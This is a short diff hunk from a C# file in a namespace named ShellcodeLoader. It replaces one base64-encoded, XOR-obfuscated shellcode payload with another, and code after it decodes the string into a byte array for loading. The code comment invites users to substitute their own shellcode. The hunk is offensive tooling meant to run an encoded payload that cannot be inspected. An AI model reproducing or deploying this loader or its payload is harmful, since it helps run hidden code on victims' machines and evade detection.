@@ -30,7 +30,7 @@ namespace ShellcodeLoader
             // Replace the following with your shellcode
 
             // base64 of xored shellcode
-            string base64String = "VyVgq83vy0QKmh+LIJ/fIJ/jIJ/7IL/HmjLgHIfJmg1Dl6yTqeHPagLiqgqm3iK9IJ///Eatl8w/II2XLg2b58w/IJXP+8w8IIX3LgSbl4Rkn0beVMw5mg1DagLiqgrXS7gbqLAXkLDL3i23IJXLqh6JIMGkIJXzqh5kr0bue0Srj+m08Ky28ZwQS5Ww8Ub9Qk0QVDKyw/7dq82H3L7d9JmH57rJrEQHVB1XO8zvq+Qr/52Hgk2EqzI6wceHa2XAKaXtq+7GIiu/+52/652v+6UFpBIPVBh4wd25/KV2DrmOVBhqa7nlVIPn3iEHzM3vq6fvwcm5/KXtcgWwVBhsU82RnUbZwY2Hq93vq5uFq6W3D54KVBh8+Kfv/Z64w882Y5IQfk4Xq7DH86Xv683vwc2/w8bApP0QfpqH3qOiyjI69ZMQp+ngLr0QVDIGMDIQVMwsgguaag5UW3hN/afv+DI6";
+            string base64String = "VyVtq83vy0QKmg2LIJ3fIJ/jIJ/7IL/HpHqljfwQB/GO18/DiwwgpswoST+9/Ea9u0all0ajurUM48w++ka2i8w8IIT3SPemIPlkqhveVGEuZMDubPUP3jvs1jXU1umaT5Vk8+nueKtkp4Zk89HueEbrIMw/IonLj5a0ypS1+jIP9JK1IN8EJpCFqkBqGc3vq52HmkaALDI6ED1aCZuHDVhSNjI6l8uToU0US7jqEIr82aKFq54Qfq6Ox67BzrWKqw==\r\n";
             
             // Base64 decode
             byte[] shellcode = Convert.FromBase64String(base64String);
